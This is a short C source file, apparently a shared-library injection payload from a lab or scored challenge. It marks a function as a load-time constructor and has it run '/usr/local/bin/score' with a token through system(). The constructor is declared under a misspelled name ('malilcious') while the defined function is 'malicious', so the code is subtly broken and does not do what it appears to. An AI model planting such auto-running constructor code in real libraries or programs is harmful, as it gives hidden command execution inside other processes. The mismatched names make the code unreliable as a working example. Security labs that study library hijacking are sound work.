#include <stdio.h>
#include <stdlib.h>

static void malilcious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score fdaafb3e-937e-427c-aa1b-3d48b2ca13e7");
}

